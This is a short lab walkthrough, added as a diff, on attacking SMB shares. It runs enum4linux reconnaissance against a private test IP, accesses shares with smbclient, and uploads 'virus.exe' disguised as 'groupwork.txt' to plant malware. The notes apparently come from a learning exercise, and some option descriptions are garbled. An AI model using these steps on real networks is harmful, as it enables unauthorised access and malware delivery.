@@ -1,0 +1,9 @@
+SMB Protocol:
+A protocol that helps devices within that network to share sensitive files and also helps Linux devices connect to Windows seamlessly. 
+Attackers exploit this protocol to capture sensitive files, and we can use this command to inject a payload onto target devices. 
+We used enum4linux for initial reconnaissance to see file shares available:
+Enum4linux -a <target_machine_ip> to use all options at once, like -P for password policy, -U for users, and – sN for what services, ports,  and IPs are running. 
+Used smbclient to access the file share
+	Smbclient //172.17.0.2/print$ (couldn’t access share because the $doesn’t allow to see details)
+	Smbclient //172.17.0.2/tmp (access share you would note the smb \> shows logged in)
+	Put virus.exe groupwork.txt (used put and masked an exe file to load malware to the target machine). 
